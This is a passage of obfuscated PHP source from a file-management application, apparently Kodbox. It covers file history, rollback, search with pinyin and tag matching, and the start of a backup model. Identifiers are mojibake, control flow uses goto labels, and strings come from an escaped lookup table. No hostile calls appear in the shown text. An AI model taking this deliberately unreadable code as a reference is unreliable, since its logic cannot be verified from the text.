$f¦Ï¨Ò‹Ğğ[2352] => count($fŒ®§„½ÌÀ[$f¦Ï¨Ò‹Ğğ[358]])); } return $fŒ®§„½ÌÀ; goto F”î³ÚÀ; F”î³ÚÀ: } protected function _listAppendUser(&$CµíŞ¨˜è) { $f‹ºÆšª½ =& $_SERVER[…Ò×–]; $dÔŸ–¤™« = array_to_keyvalue($CµíŞ¨˜è, $f‹ºÆšª½[33], $f‹ºÆšª½[1450]); $d„Ñ„İÑĞÍ = Model($f‹ºÆšª½[482])->userListInfo($dÔŸ–¤™«); foreach ($CµíŞ¨˜è as &$bİ÷ŞÑ¿è) { $eŠÌíÙ„Ôƒ = $bİ÷ŞÑ¿è[$f‹ºÆšª½[1450]]; $bİ÷ŞÑ¿è[$f‹ºÆšª½[382]] = $d„Ñ„İÑĞÍ[$eŠÌíÙ„Ôƒ] ? $d„Ñ„İÑĞÍ[$eŠÌíÙ„Ôƒ] : !1; } unset($bİ÷ŞÑ¿è); } public function fileInfo($DÉÚ‡ÊÂ‰Ğ) { $D®›«¥º =& $_SERVER[…Ò×–]; $bÃ”ãÈ­¹Œ = $this->tablePrefix; $f½Ã‚Ö·ÒÖ = "{$bÃ”ãÈ­¹Œ}\151\x6f\x5f\x66\x69\154\x65\40\146\151\154\x65\x73\x20\157\x6e\x20\x66\151\x6c\x65\x73\x2e\x66\151\x6c\x65\x49\x44\40\x3d\x20\x68\x69\163\x74\x6f\x72\x79\x2e\146\x69\x6c\x65\111\x44"; return $this->alias($D®›«¥º[2353])->where(array($D®›«¥º[389] => $DÉÚ‡ÊÂ‰Ğ))->join($f½Ã‚Ö·ÒÖ, $D®›«¥º[2354])->find(); } public function removeItem($Cö…©¥…É) { $DóÈµ÷„– =& $_SERVER[…Ò×–]; $aË„¿àÖªØ = array($DóÈµ÷„–[389] => $Cö…©¥…É); $a˜ïˆã›“ = $this->where($aË„¿àÖªØ)->find(); if ($a˜ïˆã›“) { $aÄÃ¢Öµ×Í = $this->where($aË„¿àÖªØ)->delete(); Model($DóÈµ÷„–[426])->remove($a˜ïˆã›“[$DóÈµ÷„–[423]]); return $aÄÃ¢Öµ×Í; } return !1; } public function removeBySource($eÆàâÛİ´Õ) { goto aÕ‡©ÌÄÖ©; bŒß‰¹í…: $fÎŠ±Öœ¿à = array($AƒéÔ™ó[387] => array($AƒéÔ™ó[7], $eÆàâÛİ´Õ)); $B”‚àğÚÀ¹ = $this->field($AƒéÔ™ó[424])->where($fÎŠ±Öœ¿à)->select(); if ($B”‚àğÚÀ¹) { $this->where($fÎŠ±Öœ¿à)->delete(); $dîêÀÆÔÇ = array_to_keyvalue($B”‚àğÚÀ¹, $AƒéÔ™ó[33], $AƒéÔ™ó[423]); Model($AƒéÔ™ó[426])->remove($dîêÀÆÔÇ); } goto c‰Ûß´Š×õ; c‰Ûß´Š×õ: return !0; goto F¥ƒÃíÛŒÃ; aÕ‡©ÌÄÖ©: $AƒéÔ™ó =& $_SERVER[…Ò×–]; if (!$eÆàâÛİ´Õ) { return !1; } if (!is_array($eÆàâÛİ´Õ)) { $eÆàâÛİ´Õ = array($eÆàâÛİ´Õ); } goto bŒß‰¹í…; F¥ƒÃíÛŒÃ: } public function setDetail($F‚–Ò†Ç¬³, $DùÕ•‚ƒ•Œ) { $AÔ¿¬Í–Ù­ =& $_SERVER[…Ò×–]; return $this->where(array($AÔ¿¬Í–Ù­[389] => $F‚–Ò†Ç¬³))->save(array($AÔ¿¬Í–Ù­[2342] => $DùÕ•‚ƒ•Œ)); } public function rollbackToItem($f¦«Æ“Öá¼, $AöÉŸÉ°İˆ) { goto AëğŠÍã™ğ; AëğŠÍã™ğ: $b¾Ô¨‘“ïí =& $_SERVER[…Ò×–]; $B‡ÇÃÀ‚Ÿ¡ = Model($b¾Ô¨‘“ïí[757])->sourceInfo($f¦«Æ“Öá¼); $this->addHistory($B‡ÇÃÀ‚Ÿ¡); goto E³ÌŠÍÖùæ; E³ÌŠÍÖùæ: $E®Ñáª»™ = $this->find($AöÉŸÉ°İˆ); $Fùî–èêŠ™ = array($b¾Ô¨‘“ïí[423] => $E®Ñáª»™[$b¾Ô¨‘“ïí[423]], $b¾Ô¨‘“ïí[77] => $E®Ñáª»™[$b¾Ô¨‘“ïí[77]], $b¾Ô¨‘“ïí[107] => time(), $b¾Ô¨‘“ïí[383] => USER_ID); Model($b¾Ô¨‘“ïí[757])->where(array($b¾Ô¨‘“ïí[373] => $f¦«Æ“Öá¼))->save($Fùî–èêŠ™); goto b©Ï·¶º½º; b©Ï·¶º½º: return $this->where(array($b¾Ô¨‘“ïí[389] => $AöÉŸÉ°İˆ))->delete(); goto dÓÚ÷Ø‘; dÓÚ÷Ø‘: } public function clearSame($cŞ·‰”·¶‡) { goto B›ÆÕ¸ç¢Â; C“†¬‚Ö«: $A†ê‘­¯«¸ = array(); $d¨–Õí…ÄË = array(); foreach ($BÚ°…·›¿µ as $a›™’Ñù„) { if (!$a›™’Ñù„ || count($a›™’Ñù„) <= 1) { continue; } foreach ($a›™’Ñù„ as $dÅ‹¸ÚÜ÷ª) { $A†ê‘­¯«¸[] = $dÅ‹¸ÚÜ÷ª[$d£ä‡‘¬¨[423]]; $d¨–Õí…ÄË[] = $dÅ‹¸ÚÜ÷ª[$d£ä‡‘¬¨[371]]; } } goto aÔ …¢›„‹; B›ÆÕ¸ç¢Â: $d£ä‡‘¬¨ =& $_SERVER[…Ò×–]; $eƒäÜÌªéŠ = $this->listData($cŞ·‰”·¶‡); $BÚ°…·›¿µ = array_to_keyvalue_group($eƒäÜÌªéŠ, $d£ä‡‘¬¨[423]); goto C“†¬‚Ö«; aÔ …¢›„‹: if (!$d¨–Õí…ÄË) { return; } $this->where(array($d£ä‡‘¬¨[371] => array($d£ä‡‘¬¨[7], $d¨–Õí…ÄË)))->delete(); Model($d£ä‡‘¬¨[426])->remove($A†ê‘­¯«¸); goto fµòõÒ³¦; fµòõÒ³¦: } public function userSpace() { $Fñï—‡ø­ö =& $_SERVER[…Ò×–]; $f¹…«„¥¢ = $this->tablePrefix; $e”ÇğÖÁä = array($Fñï—‡ø­ö[1441] => USER_ID); $D°Ó£à…×¼ = "{$f¹…«„¥¢}\151\x6f\x5f\146\151\154\x65\40\146\x69\x6c\145\x73\40\x6f\x6e\40\146\151\154\145\163\56\146\x69\x6c\x65\x49\104\x20\75\40\150\151\163\164\x6f\162\x79\x2e\x66\x69\x6c\145\111\x44"; return $this->alias($Fñï—‡ø­ö[2353])->where($e”ÇğÖÁä)->join($D°Ó£à…×¼, $Fñï—‡ø­ö[2354])->sum($Fñï—‡ø­ö[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($aÀ¡À“¶Ş¬) { goto eŠ‰ğùŸ­¯; DÈå´‚Üç†: if (!$DÜ«ßéÆ´É[$DšÏ»ä›‹æ[165]]) { $E‘¦’«¹­ = array_to_keyvalue($EëŠ‰¯«Õ, $DšÏ»ä›‹æ[33], $DšÏ»ä›‹æ[165]); $aÈ‡‡î°‚è = implode($DšÏ»ä›‹æ[47], $E‘¦’«¹­); $EÑŒô•Óè» = $DšÏ»ä›‹æ[2302]; } $fãÀ§Ğ±˜‹ = explode($DšÏ»ä›‹æ[47], trim($aÈ‡‡î°‚è, $DšÏ»ä›‹æ[47])); return array($EÑŒô•Óè», $fãÀ§Ğ±˜‹); goto e‡ÕåØê­Ô; eŠ‰ğùŸ­¯: $DšÏ»ä›‹æ =& $_SERVER[…Ò×–]; $EëŠ‰¯«Õ = KodIO::fileTypeList(); $DÜ«ßéÆ´É = $EëŠ‰¯«Õ[$aÀ¡À“¶Ş¬]; goto fœí¹—•ƒ–; fœí¹—•ƒ–: if (!$DÜ«ßéÆ´É) { return array(); } $aÈ‡‡î°‚è = $DÜ«ßéÆ´É[$DšÏ»ä›‹æ[165]]; $EÑŒô•Óè» = $DšÏ»ä›‹æ[7]; goto DÈå´‚Üç†; e‡ÕåØê­Ô: } public function listPathType($Eáò‚‡’À) { $F¿Ä‚¶Çµ“ =& $_SERVER[…Ò×–]; $e’ö†”Ø×Ò = $this->fileTypeWhere($Eáò‚‡’À); if (!$e’ö†”Ø×Ò) { return array(); } $eò¸†ŠÈìç = array($F¿Ä‚¶Çµ“[526] => SourceModel::TYPE_USER, $F¿Ä‚¶Çµ“[527] => USER_ID, $F¿Ä‚¶Çµ“[523] => 0, $F¿Ä‚¶Çµ“[524] => $e’ö†”Ø×Ò); return $this->listSource($eò¸†ŠÈìç); } public function listSearch($føÇ¦ìµ‚œ, $e§åŒˆ¶ªÆ = 300) { goto dÅ‡‹ÖÂĞ‚; d”ÒòğØÎÌ: $this->_listSearchBindPinyin($føÇ¦ìµ‚œ, $BóÀ¯ÉÚ×Ş, $f¢Ó„ñ‘…); $this->alias($e‡ŠÌåÏóš[492])->_makeOrder(); $B†¯¤é„† = $this->distinct(!0)->field($f¢Ó„ñ‘…)->where($BóÀ¯ÉÚ×Ş)->selectPage($e§åŒˆ¶ªÆ); goto BØ³‡˜”¡«; dÅ‡‹ÖÂĞ‚: $e‡ŠÌåÏóš =& $_SERVER[…Ò×–]; if (isset($føÇ¦ìµ‚œ[$e‡ŠÌåÏóš[2200]]) && $føÇ¦ìµ‚œ[$e‡ŠÌåÏóš[2200]]) { $føÇ¦ìµ‚œ[$e‡ŠÌåÏóš[2200]] = str_replace($e‡ŠÌåÏóš[1604], $e‡ŠÌåÏóš[2355], trim($føÇ¦ìµ‚œ[$e‡ŠÌåÏóš[2200]])); } $BóÀ¯ÉÚ×Ş = $this->_parseSearchWhere($føÇ¦ìµ‚œ); goto e¹ê¯òç…Ì; eñ¢“÷¤×Õ: $this->_listDataApply($B†¯¤é„†[$e‡ŠÌåÏóš[358]]); $this->_listMake($B†¯¤é„†); return $B†¯¤é„†; goto b•ƒß‚¸ô; BØ³‡˜”¡«: $this->_listSearchDesc($B†¯¤é„†, $føÇ¦ìµ‚œ, $DÆÌÑ£’éš); $this->_listSearchTag($B†¯¤é„†, $føÇ¦ìµ‚œ, $DÆÌÑ£’éš); $this->_listSearchGroupTag($B†¯¤é„†, $føÇ¦ìµ‚œ, $DÆÌÑ£’éš); goto eñ¢“÷¤×Õ; e¹ê¯òç…Ì: if (!isset($BóÀ¯ÉÚ×Ş[$e‡ŠÌåÏóš[401]])) { $BóÀ¯ÉÚ×Ş[$e‡ŠÌåÏóš[401]] = 0; } $f¢Ó„ñ‘… = $e‡ŠÌåÏóš[2356]; $DÆÌÑ£’éš = $f¢Ó„ñ‘…; goto d”ÒòğØÎÌ; b•ƒß‚¸ô: } private function _listSearchTag(&$BÎâ§Š†Â, $EğÚ¥¢Îíº, $A–ˆÏ‰ÃÏ²) { goto d¨œ§ªßÒ; d˜âó¯¬‹¸: if (!$f¶’§¦Æ´) { return; } $e¹¥Æ¼»Ó = array($Dï›ã½èÑ¶[397] => array($Dï›ã½èÑ¶[7], $f¶’§¦Æ´), $Dï›ã½èÑ¶[1450] => USER_ID); $bƒ‰è¨¾ä’ = Model($Dï›ã½èÑ¶[398])->field($Dï›ã½èÑ¶[75])->where($e¹¥Æ¼»Ó)->select(); goto Aº­¤ÑÉå; B¸³Âí„Ÿ: $f¶’§¦Æ´ = array(); $FÃ›ºàÇ¤ = $EğÚ¥¢Îíº[$Dï›ã½èÑ¶[2200]]; foreach ($FË–’’‚Ää as $B¸Ñ³„ìğÄ) { $BöÑÙºé› = $B¸Ñ³„ìğÄ[$Dï›ã½èÑ¶[28]]; $e©ç‚„ë› = str_replace($Dï›ã½èÑ¶[50], $Dï›ã½èÑ¶[33], Pinyin::encode($BöÑÙºé›)); if (stripos($BöÑÙºé›, $FÃ›ºàÇ¤) !== !1 || stripos($e©ç‚„ë›, $FÃ›ºàÇ¤) !== !1) { $f¶’§¦Æ´[] = $B¸Ñ³„ìğÄ[$Dï›ã½èÑ¶[371]]; } } goto d˜âó¯¬‹¸; d¨œ§ªßÒ: $Dï›ã½èÑ¶ =& $_SERVER[…Ò×–]; if (!$EğÚ¥¢Îíº[$Dï›ã½èÑ¶[2200]] || $BÎâ§Š†Â[$Dï›ã½èÑ¶[355]][$Dï›ã½èÑ¶[344]] > 1) { return; } $FË–’’‚Ää = Model($Dï›ã½èÑ¶[2357])->listData(); goto B¸³Âí„Ÿ; Aº­¤ÑÉå: $bƒ‰è¨¾ä’ = array_to_keyvalue($bƒ‰è¨¾ä’, $Dï›ã½èÑ¶[33], $Dï›ã½èÑ¶[75]); $EÅ“ª˜¼÷ò = array_unique($bƒ‰è¨¾ä’); $this->_listSearchMerge($BÎâ§Š†Â, $EğÚ¥¢Îíº, $A–ˆÏ‰ÃÏ², $EÅ“ª˜¼÷ò); goto B¹ëÜÚ‘«Ó; B¹ëÜÚ‘«Ó: } private function _listSearchDesc(&$DÌ–Øªšå, $EµØºÑ´¦ø, $a®¢ï¦») { goto dÇ¶ùÛİå˜; FÚ»ñ¿¼ßÚ: $dÆ•…ÁÇµŒ = array_unique($dÆ•…ÁÇµŒ); if (!$dÆ•…ÁÇµŒ) { return; } $BÍ…¼ä„ÃÜ = array($a¯Ã„ŞÖˆò[373] => array($a¯Ã„ŞÖˆò[7], $dÆ•…ÁÇµŒ), $a¯Ã„ŞÖˆò[89] => $a¯Ã„ŞÖˆò[409], $a¯Ã„ŞÖˆò[363] => array($a¯Ã„ŞÖˆò[756], $a¯Ã„ŞÖˆò[2202] . $EµØºÑ´¦ø[$a¯Ã„ŞÖˆò[2200]] . $a¯Ã„ŞÖˆò[2202])); goto a¬ÅÖí¯’Ü; dÇ¶ùÛİå˜: $a¯Ã„ŞÖˆò =& $_SERVER[…Ò×–]; if (!$EµØºÑ´¦ø[$a¯Ã„ŞÖˆò[2200]] || $DÌ–Øªšå[$a¯Ã„ŞÖˆò[355]][$a¯Ã„ŞÖˆò[344]] > 1) { return; } $dÆ•…ÁÇµŒ = $this->listSearchChildren($EµØºÑ´¦ø[$a¯Ã„ŞÖˆò[466]]); goto FÚ»ñ¿¼ßÚ; a¬ÅÖí¯’Ü: $a“ˆ­­‹×ã = Model($a¯Ã„ŞÖˆò[509])->field($a¯Ã„ŞÖˆò[373])->where($BÍ…¼ä„ÃÜ)->select(); $CÄ÷È¨è«† = array_to_keyvalue($a“ˆ­­‹×ã, $a¯Ã„ŞÖˆò[33], $a¯Ã„ŞÖˆò[373]); $this->_listSearchMerge($DÌ–Øªšå, $EµØºÑ´¦ø, $a®¢ï¦», $CÄ÷È¨è«†); goto Aßí†ó‰Ç; Aßí†ó‰Ç: } private function _listSearchGroupTag(&$Eçˆ«¿†¾, $añ«©£‹Ÿ, $DßæÄÚ¹„) { goto dÖ¯¾Şó®; dÖ¯¾Şó®: $Dªá¢Œâ¬ =& $_SERVER[…Ò×–]; if (!$añ«©£‹Ÿ[$Dªá¢Œâ¬[2200]] || $Eçˆ«¿†¾[$Dªá¢Œâ¬[355]][$Dªá¢Œâ¬[344]] > 1 || !$añ«©£‹Ÿ[$Dªá¢Œâ¬[466]]) { return; } $c½Ÿ×§Œà = $this->sourceInfo($añ«©£‹Ÿ[$Dªá¢Œâ¬[466]]); goto b¶‚ÛÌÛ¼; cÀ¾·£ë¥ñ: $c¾ˆßİªò = array_to_keyvalue($c¾ˆßİªò, $Dªá¢Œâ¬[33], $Dªá¢Œâ¬[75]); $F¦ê¤¡Å‘ = array_unique($c¾ˆßİªò); $this->_listSearchMerge($Eçˆ«¿†¾, $añ«©£‹Ÿ, $DßæÄÚ¹„, $F¦ê¤¡Å‘); goto e–„Ô†‚©; Dª£Ü±ê¤: $d“Ï¼ÒÌ‡¨ = array(); $Bº¹œÆÎ±Õ = $añ«©£‹Ÿ[$Dªá¢Œâ¬[2200]]; foreach ($C©÷‰ÔğË[$Dªá¢Œâ¬[358]] as $F‡õ¤†İØ¾) { $CİêÃ“‘È = $F‡õ¤†İØ¾[$Dªá¢Œâ¬[28]]; $aÜÕÜÈæš = str_replace($Dªá¢Œâ¬[50], $Dªá¢Œâ¬[33], Pinyin::encode($CİêÃ“‘È)); if (stripos($CİêÃ“‘È, $Bº¹œÆÎ±Õ) !== !1 || stripos($aÜÕÜÈæš, $Bº¹œÆÎ±Õ) !== !1) { $d“Ï¼ÒÌ‡¨[] = $F‡õ¤†İØ¾[$Dªá¢Œâ¬[371]]; } } goto AÑåõ—£‹½; b¶‚ÛÌÛ¼: if (!$c½Ÿ×§Œà || $c½Ÿ×§Œà[$Dªá¢Œâ¬[375]] != SourceModel::TYPE_GROUP) { return; } $cù†”™âÔ° = $c½Ÿ×§Œà[$Dªá¢Œâ¬[461]]; $C©÷‰ÔğË = Model($Dªá¢Œâ¬[2358])->get($cù†”™âÔ°); goto Dª£Ü±ê¤; AÑåõ—£‹½: if (!$d“Ï¼ÒÌ‡¨) { return; } $dœÓ¦„Š„À = array($Dªá¢Œâ¬[397] => array($Dªá¢Œâ¬[7], $d“Ï¼ÒÌ‡¨), $Dªá¢Œâ¬[1450] => 0, $Dªá¢Œâ¬[29] => $Dªá¢Œâ¬[2220] . $cù†”™âÔ°); $c¾ˆßİªò = Model($Dªá¢Œâ¬[398])->field($Dªá¢Œâ¬[75])->where($dœÓ¦„Š„À)->select(); goto cÀ¾·£ë¥ñ; e–„Ô†‚©: } private function _listSearchMerge(&$D§İ†‹ãÂ, $aÔÎòŞ÷’, $C´ÄÜŒ¨™°, $BÈ¥¥‰´Øæ) { goto FæÏ¥™á¬ù; CÒš£ö÷¸•: $C¶ÈôŒ†Ú÷ = $this->field($C´ÄÜŒ¨™°)->where($bˆ½¯Ù–’‘)->select(); if (!$C¶ÈôŒ†Ú÷) { return; } $FÜ³ªšÌÊŠ = array(); goto E¼íºäåêë; FæÏ¥™á¬ù: $c•‰•ò Î =& $_SERVER[…Ò×–]; if (!$BÈ¥¥‰´Øæ) { return; } $fÉÆÅÙ–•º = array_to_keyvalue($D§İ†‹ãÂ[$c•‰•ò Î[358]], $c•‰•ò Î[33], $c•‰•ò Î[373]); goto e‰éÄÏªÒğ; e‰éÄÏªÒğ: $AñŞ‚Ñå°½ = array_diff($BÈ¥¥‰´Øæ, $fÉÆÅÙ–•º); if (!$AñŞ‚Ñå°½) { return; } $bˆ½¯Ù–’‘ = array($c•‰•ò Î[373] => array($c•‰•ò Î[7], $AñŞ‚Ñå°½)); goto CÒš£ö÷¸•; E¼íºäåêë: foreach ($C¶ÈôŒ†Ú÷ as $BÑçôĞŠõ¸) { $f»„ššÂÖÇ = $c•‰•ò Î[47] . $aÔÎòŞ÷’[$c•‰•ò Î[466]] . $c•‰•ò Î[47]; if (stripos($BÑçôĞŠõ¸[$c•‰•ò Î[464]], $f»„ššÂÖÇ) !== !1) { $FÜ³ªšÌÊŠ[] = $BÑçôĞŠõ¸; } } $D§İ†‹ãÂ[$c•‰•ò Î[358]] = array_merge($FÜ³ªšÌÊŠ, $D§İ†‹ãÂ[$c•‰•ò Î[358]]); $D§İ†‹ãÂ[$c•‰•ò Î[355]][$c•‰•ò Î[356]] += count($FÜ³ªšÌÊŠ); goto Dôîµ×¨‘¾; Dôîµ×¨‘¾: } public function listSearchChildren($fØÍæÎƒè, $a»²ÅòÚ¢ = 5000) { goto DÏöµĞÆë; E§óéª”Š: $F¿À§š«Ñ’ = $this->field($eîØœ‚Ù[373])->where($bÔŒ´Šï™˜)->select(); $cƒ¢ÓÂî× = array_to_keyvalue($F¿À§š«Ñ’, $eîØœ‚Ù[33], $eîØœ‚Ù[373]); return $cƒ¢ÓÂî×; goto D—ƒ·ŒÇœÍ; eÈÅç¼†Éç: $bÔŒ´Šï™˜ = array($eîØœ‚Ù[464] => array($eîØœ‚Ù[756], $dÛî‚‹Ö‹[$eîØœ‚Ù[464]] . $dÛî‚‹Ö‹[$eîØœ‚Ù[373]] . $eîØœ‚Ù[489])); $eĞîéêñ±ó = $this->field($eîØœ‚Ù[373])->cache(null, 600)->where($bÔŒ´Šï™˜)->count(); if ($eĞîéêñ±ó > $a»²ÅòÚ¢) { return $this->_listSearchChildrenNear($fØÍæÎƒè, $a»²ÅòÚ¢); } goto E§óéª”Š; DÏöµĞÆë: $eîØœ‚Ù =& $_SERVER[…Ò×–]; $cƒ¢ÓÂî× = array(); $dÛî‚‹Ö‹ = $this->sourceInfo($fØÍæÎƒè); goto eÈÅç¼†Éç; D—ƒ·ŒÇœÍ: } private function _listSearchChildrenNear($CİŞ¯Ç„ì, $E¼šõÌ’‹‚) { goto f¯’ªÜÅ›; eæ‹ß®©“: if (!$aÍÎ„ó˜×ƒ) { return $B–óÒƒÎ¬; } $FÎ—®Û—Ö† = array($fÏµ¾ğ“‘ë[466] => array($fÏµ¾ğ“‘ë[7], $aÍÎ„ó˜×ƒ)); $CÆÜêœ§§² = $this->field($fÏµ¾ğ“‘ë[2359])->where($FÎ—®Û—Ö†)->select(); goto F‹ã¤ÄÜ›³; F‹ã¤ÄÜ›³: $B–óÒƒÎ¬ = array_merge($B–óÒƒÎ¬, array_to_keyvalue($CÆÜêœ§§², $fÏµ¾ğ“‘ë[33], $fÏµ¾ğ“‘ë[373])); $B–óÒƒÎ¬ = array_slice($B–óÒƒÎ¬, 0, $E¼šõÌ’‹‚); return $B–óÒƒÎ¬; goto c’Š÷â»Ä¡; Bİ¼•ğŸÒ: $CÆÜêœ§§² = $this->field($fÏµ¾ğ“‘ë[2359])->where($FÎ—®Û—Ö†)->select(); $aÍÎ„ó˜×ƒ = array_to_keyvalue(array_filter_by_field($CÆÜêœ§§², $fÏµ¾ğ“‘ë[374], $fÏµ¾ğ“‘ë[83]), $fÏµ¾ğ“‘ë[33], $fÏµ¾ğ“‘ë[373]); $B–óÒƒÎ¬ = array_merge($B–óÒƒÎ¬, array_to_keyvalue($CÆÜêœ§§², $fÏµ¾ğ“‘ë[33], $fÏµ¾ğ“‘ë[373])); goto eæ‹ß®©“; f¯’ªÜÅ›: $fÏµ¾ğ“‘ë =& $_SERVER[…Ò×–]; $B–óÒƒÎ¬ = array(); $FÎ—®Û—Ö† = array($fÏµ¾ğ“‘ë[466] => $CİŞ¯Ç„ì); goto Bİ¼•ğŸÒ; c’Š÷â»Ä¡: } private function _listSearchBindPinyin($CìªÉ”¹‰¶, &$cˆÀ…–ÅÁÌ, &$fãÏØŒš«) { goto cÒÉÎ×İ‰; CáŒŞÈËÈ¡: unset($cˆÀ…–ÅÁÌ[$Aã¾È««ùö[28]]); foreach ($cˆÀ…–ÅÁÌ as $a¡”ÂØè“ => $AŠ¶åôØã¢) { $Eï±‚Õˆùô[$Aã¾È««ùö[2361] . $a¡”ÂØè“] = $AŠ¶åôØã¢; } $cåÃÇŞãö» = array($Aã¾È««ùö[488], $Aã¾È««ùö[2202] . $CìªÉ”¹‰¶[$Aã¾È««ùö[2200]] . $Aã¾È««ùö[2202]); goto eæŠÊ×¯šŠ; cÒÉÎ×İ‰: $Aã¾È««ùö =& $_SERVER[…Ò×–]; if (!Input::check($CìªÉ”¹‰¶[$Aã¾È««ùö[2200]], $Aã¾È««ùö[310]) || strlen($CìªÉ”¹‰¶[$Aã¾È««ùö[2200]]) < 2) { return; } $cÓÁõ„¡ØÄ = "\114\105\106\x54\40\112\117\111\x4e\x20{$this->tablePrefix}\x69\x6f\137\163\157\x75\x72\143\x65\137\x6d\145\x74\141\x20\155\145\164\x61\x20\157\156\40\163\157\x75\x72\x63\x65\56\x73\157\x75\162\143\x65\111\104\40\75\40\155\x65\164\x61\56\x73\x6f\x75\162\143\145\111\104"; goto bï¯¾Êˆ©; eæŠÊ×¯šŠ: $Eï±‚Õˆùô[] = array($Aã¾È««ùö[2363] => $cåÃÇŞãö», $Aã¾È««ùö[920] => $Aã¾È««ùö[2204], array($Aã¾È««ùö[2364] => $cåÃÇŞãö», $Aã¾È««ùö[2365] => array($Aã¾È««ùö[7], array($Aã¾È««ùö[420], $Aã¾È««ùö[419])))); $this->join($cÓÁõ„¡ØÄ); $cˆÀ…–ÅÁÌ = $Eï±‚Õˆùô; goto e»¸©¡Ã; bï¯¾Êˆ©: $Eï±‚Õˆùô = array(); $fãÏØŒš« = str_replace(array($Aã¾È««ùö[221], $Aã¾È««ùö[50], $Aã¾È««ùö[2360]), $Aã¾È««ùö[33], $fãÏØŒš«); $fãÏØŒš« = $Aã¾È««ùö[2361] . str_replace($Aã¾È««ùö[47], $Aã¾È««ùö[2362], $fãÏØŒš«); goto CáŒŞÈËÈ¡; e»¸©¡Ã: } private function _parseSearchWhere($C™›‹Ë¨î) { goto CÓ °¬éğ; CÓ °¬éğ: $eƒÏ•“¶ =& $_SERVER[…Ò×–]; $A×ê“¥§‹„ = array(); if (isset($C™›‹Ë¨î[$eƒÏ•“¶[707]])) { $A×ê“¥§‹„[$eƒÏ•“¶[107]] = array($eƒÏ•“¶[2366], $C™›‹Ë¨î[$eƒÏ•“¶[707]]); } goto FÆí©ÀÑ; FÆí©ÀÑ: if (isset($C™›‹Ë¨î[$eƒÏ•“¶[452]])) { $e¯ôÏ‡àŒ× = array($eƒÏ•“¶[2367], $C™›‹Ë¨î[$eƒÏ•“¶[452]]); if ($A×ê“¥§‹„[$eƒÏ•“¶[107]]) { $A×ê“¥§‹„[$eƒÏ•“¶[107]] = array($A×ê“¥§‹„[$eƒÏ•“¶[107]], $e¯ôÏ‡àŒ×, $eƒÏ•“¶[2368]); } else { $A×ê“¥§‹„[$eƒÏ•“¶[107]] = $e¯ôÏ‡àŒ×; } } if (isset($C™›‹Ë¨î[$eƒÏ•“¶[2369]])) { $A×ê“¥§‹„[$eƒÏ•“¶[77]] = array($eƒÏ•“¶[2366], $C™›‹Ë¨î[$eƒÏ•“¶[2369]]); } if (isset($C™›‹Ë¨î[$eƒÏ•“¶[2370]])) { $e¯ôÏ‡àŒ× = array($eƒÏ•“¶[2367], $C™›‹Ë¨î[$eƒÏ•“¶[2370]]); if ($A×ê“¥§‹„[$eƒÏ•“¶[77]]) { $A×ê“¥§‹„[$eƒÏ•“¶[77]] = array($A×ê“¥§‹„[$eƒÏ•“¶[77]], $e¯ôÏ‡àŒ×, $eƒÏ•“¶[2368]); } else { $A×ê“¥§‹„[$eƒÏ•“¶[77]] = $e¯ôÏ‡àŒ×; } } goto DÜæœñÀà; DÜæœñÀà: if (isset($C™›‹Ë¨î[$eƒÏ•“¶[539]])) { $A×ê“¥§‹„[] = array($eƒÏ•“¶[383] => $C™›‹Ë¨î[$eƒÏ•“¶[539]], $eƒÏ•“¶[382] => $C™›‹Ë¨î[$eƒÏ•“¶[539]], $eƒÏ•“¶[920] => $eƒÏ•“¶[2204]); } if (isset($C™›‹Ë¨î[$eƒÏ•“¶[376]])) { $b…¿×óê¹º = $C™›‹Ë¨î[$eƒÏ•“¶[376]]; if ($b…¿×óê¹º == $eƒÏ•“¶[76]) { $A×ê“¥§‹„[$eƒÏ•“¶[374]] = 1; } else { if ($b…¿×óê¹º == $eƒÏ•“¶[2371]) { $A×ê“¥§‹„[$eƒÏ•“¶[374]] = 0; } else { if ($b…¿×óê¹º) { $b…¿×óê¹º = is_array($b…¿×óê¹º) ? $b…¿×óê¹º : explode($eƒÏ•“¶[47], $b…¿×óê¹º); $A×ê“¥§‹„[$eƒÏ•“¶[376]] = array($eƒÏ•“¶[388], $b…¿×óê¹º); $A×ê“¥§‹„[$eƒÏ•“¶[374]] = 0; } } } } if (isset($C™›‹Ë¨î[$eƒÏ•“¶[466]])) { $DîĞé¸ÃîŞ = $this->sourceInfo($C™›‹Ë¨î[$eƒÏ•“¶[466]]); $A×ê“¥§‹„[$eƒÏ•“¶[530]] = array($eƒÏ•“¶[488], $DîĞé¸ÃîŞ[$eƒÏ•“¶[464]] . $C™›‹Ë¨î[$eƒÏ•“¶[466]] . $eƒÏ•“¶[489]); } goto bŒáÒÏ¼¾; bŒáÒÏ¼¾: if (isset($C™›‹Ë¨î[$eƒÏ•“¶[2200]]) && $C™›‹Ë¨î[$eƒÏ•“¶[2200]]) { $F—ñßß¢½ = $C™›‹Ë¨î[$eƒÏ•“¶[2200]]; $F‚âÂ®§Ú = explode($eƒÏ•“¶[50], $F—ñßß¢½); if (strlen($F—ñßß¢½) > 2 && (substr($F—ñßß¢½, 0, 1) == $eƒÏ•“¶[113] && substr($F—ñßß¢½, -1) == $eƒÏ•“¶[113]) || substr($F—ñßß¢½, 0, 1) == $eƒÏ•“¶[55] && substr($F—ñßß¢½, -1) == $eƒÏ•“¶[55]) { $F—ñßß¢½ = substr($F—ñßß¢½, 1, -1); $F‚âÂ®§Ú = array($F—ñßß¢½); } $A×ê“¥§‹„[$eƒÏ•“¶[28]] = array($eƒÏ•“¶[488], $eƒÏ•“¶[2202] . $F—ñßß¢½ . $eƒÏ•“¶[2202]); if (count($F‚âÂ®§Ú) > 1) { $A×ê“¥§‹„[$eƒÏ•“¶[28]] = array(); foreach ($F‚âÂ®§Ú as $b­‡°ŒĞ¹±) { if (!trim($b­‡°ŒĞ¹±)) { continue; } $A×ê“¥§‹„[$eƒÏ•“¶[28]][] = array($eƒÏ•“¶[488], $eƒÏ•“¶[2202] . trim($b­‡°ŒĞ¹±) . $eƒÏ•“¶[2202]); } } } return $A×ê“¥§‹„; goto CÔÂÖ¦ãÇ£; CÔÂÖ¦ãÇ£: } } goto a°ôÄÑÊá«; D­‡“Üº»“: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\155\x2e\x62\x61\143\153\165\x70\114\151\163\x74"; public $field = array("\151\x6f", "\156\141\155\145", "\163\x74\141\164\x75\x73", "\143\157\156\164\x65\x6e\x74", "\162\x65\163\165\154\164", "\x74\x69\x6d\145\x46\x72\157\155", "\x74\x69\x6d\x65\x54\157"); public function config() { goto DÒÉÜŸ÷ê²; eƒ¯Ïä‡Î–: Action($aÕĞ”°µ‹Í[2142])->taskInit(); 